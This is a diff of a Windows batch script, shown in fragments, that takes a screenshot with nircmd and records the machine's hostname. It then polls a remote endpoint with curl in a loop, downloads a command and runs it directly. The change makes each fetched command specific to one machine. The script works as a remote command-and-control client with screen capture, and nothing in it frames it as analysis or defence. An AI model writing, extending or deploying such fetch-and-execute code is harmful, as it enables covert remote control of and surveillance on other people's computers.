@@ -10,7 +10,7 @@ del *.jpg
 
 nircmd.exe savescreenshot test.jpg
 set interval=60000
-hostname > c:/host.txt
+hostname>c:/host.txt
 set /p USER=<c:/host.txt
 set form="pc=%USER%"
 :loop
@@ -28,7 +28,7 @@ curl %endpoint%/api/status > status
 set /p status=<status
 IF "%status%"=="%USER%" (set interval=10000) ELSE (set interval=60000)
 
-curl %endpoint%/api/getCommand/1 > temp.txt
+curl %endpoint%/api/getCommand/%USER% > temp.txt
 set /p CMD=< temp.txt
 %CMD%
 
